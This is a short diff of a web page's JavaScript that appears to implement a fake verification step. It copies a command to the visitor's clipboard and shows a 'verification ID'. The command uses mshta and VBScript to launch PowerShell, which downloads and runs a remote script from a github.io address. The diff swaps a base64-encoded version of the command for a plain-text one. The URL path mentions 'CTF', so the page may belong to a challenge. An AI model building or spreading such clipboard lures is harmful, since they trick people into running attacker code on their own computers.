@@ -414,7 +414,7 @@
 
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
-            const commandToRun = 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AaABhAGsAawB5AGEAaAB1AGQALgBnAGkAdABoAHUAYgAuAGkAbwAvAEMAVABGAC8AdQBwAGQAYQB0AGUAcwBfAEsAYgA2ADQAdQAwAHMAYQBrAGEALgBwAHMAMQAnACkAKQA="":close")'
+            const commandToRun = 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -c iex ((New-Object System.Net.WebClient).DownloadString(''https://hakkyahud.github.io/CTF/updates_Kb64u0saka.ps1''))"":close")'
             stageClipboard(commandToRun, verification_id)
         }
 
